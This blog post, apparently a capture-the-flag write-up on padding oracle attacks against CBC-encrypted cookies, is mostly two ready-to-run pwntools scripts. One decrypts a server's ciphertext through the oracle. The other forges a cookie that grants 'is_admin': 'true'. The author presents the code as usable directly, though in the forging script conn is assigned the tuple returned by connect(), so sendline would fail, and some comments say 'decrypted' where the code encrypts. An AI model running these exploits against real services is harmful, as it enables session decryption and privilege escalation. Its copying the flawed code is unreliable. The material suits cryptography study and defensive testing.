---
title: padding_oracle_attack
date: 2025-03-15 23:07:56
tags: crypto
categories: [Security]
cover: images/padding_oracle_attack.png
---

## Why it is a Vulnerability?

The server’s weakness is that it leaks whether the padding is valid through its responses, which allows an attacker to both decrypt and encrypt ciphertexts without knowing the key while using brute force attack. The key is to gain the intermediate value. When decrypting, we set a valid padding in plain text and loop previous cipher block’s bytes, try to get response with valid padding. Then use `P[i] = D(C[i]) ⊕ C[i-1]` to get the real plain text. Vice versa, when encrypting, we can set the last block in random value such as all zero, then use the similar process `C[i-1] = D(C[i]) ⊕ P[i]` to construct new cipher text with our desired plain text.

## Decrypting:

```python
#!/usr/bin/python3
import time

from pwn import *

block_size = 16

# USE YOUR SERVER'S OWN IP AND PORT
IP = "..."
PORT = "..."


def connect():
    # IF NEEDED
    # context.proxy = (socks.SOCKS5, 'localhost', YOUR_OWN_PORT)

    while True:  # try to connect until success
        try:
            conn = remote(IP, PORT)
            conn.recvline()  # Welcome
            cipher = conn.recvline().decode().split(": ")[1].strip()  # gain cipher
            conn.recvline()  # Prompt "what is your cookie"
            return conn, cipher
        except:
            time.sleep(0.01)


def padding_oracle_attack(cipher):
    cipher = bytes.fromhex(cipher)

    blocks = [cipher[i:i + block_size] for i in range(0, len(cipher), block_size)]
    plaintext = bytearray()

    # Process all blocks except the first (IV)
    for block_idx in range(len(blocks) - 1, 0, -1):
        current_block = bytearray(blocks[block_idx])
        intermediate_bytes = bytearray(block_size)

        # Try each byte position
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos

            with open('padding_output.log', 'a', buffering=1) as f:
                print(
                    f"Block {block_idx}/{len(blocks) - 1}, Starting byte: {byte_pos}",
                    file=f, flush=True
                )

            previous_block = bytearray(blocks[block_idx - 1])
            # Prepare known padding bytes
            for k in range(byte_pos + 1, block_size):
                previous_block[k] = intermediate_bytes[k] ^ padding_value

            # Try each possible byte value
            have_found_byte = False
            same_pos_with_cipher = -1
            for guess in range(256):
                previous_block[byte_pos] = guess

                # Construct full test cipher
                test_cipher = bytearray()
                test_cipher.extend(previous_block)
                test_cipher.extend(current_block)

                # Send the test blocks to server
                conn, _ = connect()
                conn.sendline(test_cipher.hex().encode())  # Send as hex string
                try:
                    response = conn.recvline().decode().strip()
                except:
                    response = ''
                conn.close()

                # Check if padding is valid
                # NEED TO MODIFY BASED ON SERVER'S REAL SITUATION
                if (not response) or (response and "invalid" not in response):
                    if guess == int(blocks[block_idx - 1][byte_pos]) and byte_pos == block_size - 1:
                        same_pos_with_cipher = guess
                    else:
                        # Valid and Calculate intermediate byte
                        intermediate_bytes[byte_pos] = guess ^ padding_value
                        have_found_byte = True
                        with open('padding_output.log', 'a', buffering=1) as f:
                            print(f"Found byte {byte_pos}: {hex(guess)}", file=f, flush=True)
                        break

            if not have_found_byte and same_pos_with_cipher != -1:
                intermediate_bytes[byte_pos] = same_pos_with_cipher ^ padding_value
                with open('padding_output.log', 'a', buffering=1) as f:
                    print(f"Found same byte {byte_pos}: {hex(guess)}!!!!", file=f, flush=True)
            if not have_found_byte and same_pos_with_cipher == -1:
                raise Exception(f"Failed to find valid byte at position {byte_pos}")

                # Calculate plaintext block using intermediate bytes and previous cipher block
        decrypted_block = bytearray(block_size)
        for i in range(block_size):
            decrypted_block[i] = intermediate_bytes[i] ^ blocks[block_idx - 1][i]

        # Add decrypted block to plaintext
        plaintext[0:0] = decrypted_block

        # Log decrypted block
        with open('padding_output.log', 'a', buffering=1) as f:
            print(
                f"Decrypted block {block_idx}: {decrypted_block.hex()}",
                file=f, flush=True
            )

    # Remove PKCS7 padding
    padding_length = plaintext[-1]
    if padding_length > block_size:
        raise Exception("Invalid padding in decrypted text")

    # Verify padding
    for i in range(1, padding_length + 1):
        if plaintext[-i] != padding_length:
            raise Exception("Invalid padding in decrypted text")

    return plaintext[:-padding_length]


# Main execution
context.log_level = 'error'
first_conn, cipher = connect()
first_conn.close()

result = padding_oracle_attack(cipher)

print("\nFinal result (hex):", result.hex())
if all(32 <= byte <= 126 for byte in result):  # Check if printable ASCII
    print("Final result:", result.decode())

with open('padding_output.log', 'a') as f:
    print(f"Final result (hex):{result.hex()}", file=f, flush=True)
    print(f"Final result: {result.decode()}", file=f, flush=True)

```

## Encrypting

```python
#!/usr/bin/python3
import time

from pwn import *

block_size = 16

# USE YOUR SERVER'S OWN IP AND PORT
IP = "..."
PORT = "..."


def pad(s):
    return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)


def connect():
    #IF NEEDED
    #context.proxy = (socks.SOCKS5, 'localhost', YOUR_OWN_PORT)

    while True:  # try to connect until success
        try:
            conn = remote(IP, PORT)
            conn.recvline()  # Welcome
            cipher = conn.recvline().decode().split(": ")[1].strip()  # gain cipher
            conn.recvline()  # Prompt "what is your cookie"
            return conn, cipher
        except:
            time.sleep(0.01)


def padding_oracle_attack(plain):
    plain = bytes.fromhex(plain)
    plain_blocks = [plain[i:i + block_size] for i in range(0, len(plain), block_size)]  # 5

    cipher_text = bytearray((len(plain_blocks) + 1) * block_size)  # 6
    cipher_blocks = [cipher_text[i:i + block_size] for i in range(0, len(cipher_text), block_size)]

    for block_idx in range(len(cipher_blocks) - 1, 0, -1):
        current_block = bytearray(cipher_blocks[block_idx])
        intermediate_bytes = bytearray(block_size)

        # Try each byte position
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos

            with open('create_cipher.log', 'a', buffering=1) as f:
                print(
                    f"Block {block_idx}/{len(cipher_blocks) - 1}, Starting byte: {byte_pos}",
                    file=f, flush=True
                )

            previous_block = bytearray(cipher_blocks[block_idx - 1])
            # Prepare known padding bytes
            for k in range(byte_pos + 1, block_size):
                previous_block[k] = intermediate_bytes[k] ^ padding_value

            # Try each possible byte value
            have_found_byte = False
            for guess in range(256):
                previous_block[byte_pos] = guess

                # Construct full test cipher
                test_cipher = bytearray()
                test_cipher.extend(previous_block)
                test_cipher.extend(current_block)

                # Send the test blocks to server
                conn = connect()
                conn.sendline(test_cipher.hex().encode())  # Send as hex string
                try:
                    response = conn.recvline().decode().strip()
                except:
                    response = ''
                conn.close()

                # Check if padding is valid
                if (not response) or (response and "invalid" not in response):
                    # Valid and Calculate intermediate byte
                    intermediate_bytes[byte_pos] = guess ^ padding_value
                    have_found_byte = True

                    with open('create_cipher.log', 'a', buffering=1) as f:
                        print(f"Found byte {byte_pos}: {hex(guess)}, interm:{hex(intermediate_bytes[byte_pos])}",
                              file=f, flush=True)
                    break

            # If we didn't find a valid byte, something went wrong
            if not have_found_byte:
                raise Exception(f"Failed to find valid byte at position {byte_pos}")

        # Calculate cipher_text block using intermediate bytes and previous cipher block
        encrypted_block = bytearray(block_size)
        for i in range(block_size):
            encrypted_block[i] = intermediate_bytes[i] ^ plain_blocks[block_idx - 1][i]
            cipher_blocks[block_idx - 1][i] = encrypted_block[i]

        # Add decrypted block to cipher_text
        cipher_text[(block_idx - 1) * 16:block_idx * 16] = encrypted_block

        # Log decrypted block
        with open('create_cipher.log', 'a', buffering=1) as f:
            print(
                f"Encrypted block {block_idx}: {encrypted_block.hex()}, Intermediate bytes: {intermediate_bytes.hex()}\n blocks:{cipher_blocks}",
                file=f, flush=True
            )

    return cipher_text


# Main execution
context.log_level = 'error'
# old plain: {"username": "guest", "expires": "2000-01-07", "is_admin": "false"}
new_plain = pad('{"username": "guest", "expires": "2030-11-11", "is_admin": "true"}')
new_plain = new_plain.encode().hex()
print(new_plain)

result = padding_oracle_attack(new_plain)

result = result.hex()

print("\nFinal result (hex):", result)

with open('create_cipher.log', 'a') as f:
    print(f"Final result (hex):{result}", file=f, flush=True)

```

I encountered a minor issue worth noting. If the end of the decrypted content needs to match the old cookie value, false positives can occur. Specifically, the decrypted hex might still be the old ciphertext.

Therefore, when cracking the last byte of the (n-1) block, we need to consider two possible scenarios. This code already accounts for this situation and can be used directly.

In more technical terms:

- When performing a padding oracle attack, the verification of the last byte in a block can be ambiguous
- If the expected padding at the end matches a pattern that already exists in the old cookie, the decryption might
  appear successful but actually return the original ciphertext
- The solution is to test both possibilities when cracking the final byte of each (n-1) block
- The implementation already handles this edge case correctly
